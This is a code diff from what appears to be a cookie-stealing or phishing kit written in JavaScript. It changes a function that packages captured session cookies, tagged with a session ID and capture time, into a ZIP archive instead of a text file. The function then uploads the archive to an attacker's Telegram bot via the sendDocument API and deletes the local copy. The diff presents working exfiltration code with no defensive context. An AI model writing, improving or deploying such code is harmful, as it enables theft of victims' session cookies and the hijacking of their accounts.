@@ -45,33 +45,39 @@ function extractCookiesFromHeaders(headers) {
     return Object.keys(cookies).length ? cookies : null;
 }
 
+const AdmZip = require('adm-zip');
+
 async function sendCookiesAsFile(cookies, sessionId) {
     if (!cookies || Object.keys(cookies).length === 0) return;
 
     const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
     const randomName = Math.random().toString(36).substring(2, 10);
-    const filename = `session_${randomName}_${timestamp}.txt`;
+    const filename = `session_${randomName}_${timestamp}.zip`;
     const tmpDir = require('os').tmpdir();
-    const filePath = path.join(tmpDir, filename);
+    const zipPath = path.join(tmpDir, filename);
 
-    const content = `# Session Cookies\n# Session ID: ${sessionId}\n# Captured: ${new Date().toISOString()}\n\n${JSON.stringify(cookies, null, 2)}`;
-    fs.writeFileSync(filePath, content);
+    // 𝙲𝚛𝚎𝚊𝚝𝚎 𝚉𝙸𝙿 𝚏𝚒𝚕𝚎
+    const zip = new AdmZip();
+    const cookieData = `# Session Cookies\n# Session ID: ${sessionId}\n# Captured: ${new Date().toISOString()}\n\n${JSON.stringify(cookies, null, 2)}`;
+    zip.addFile('cookies.txt', Buffer.from(cookieData, 'utf-8'));
+    zip.writeZip(zipPath);
 
     try {
         const FormData = require('form-data');
         const form = new FormData();
         form.append('chat_id', CHAT_ID);
-        form.append('document', fs.createReadStream(filePath), { filename: filename });
-        form.append('caption', `📎 Cookie file: ${filename}`);
+        form.append('document', fs.createReadStream(zipPath), { filename: filename });
+        form.append('caption', `📎 Cookie file (ZIP): ${filename}`);
 
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
             headers: form.getHeaders()
         });
+        console.log('✅ ZIP file sent to Telegram:', filename);
     } catch (e) {
-        console.log('Cookie file send failed', e.message);
+        console.log('❌ ZIP send failed:', e.message);
     }
 
-    try { fs.unlinkSync(filePath); } catch (e) {}
+    try { fs.unlinkSync(zipPath); } catch (e) {}
 }
 
 // ================================================
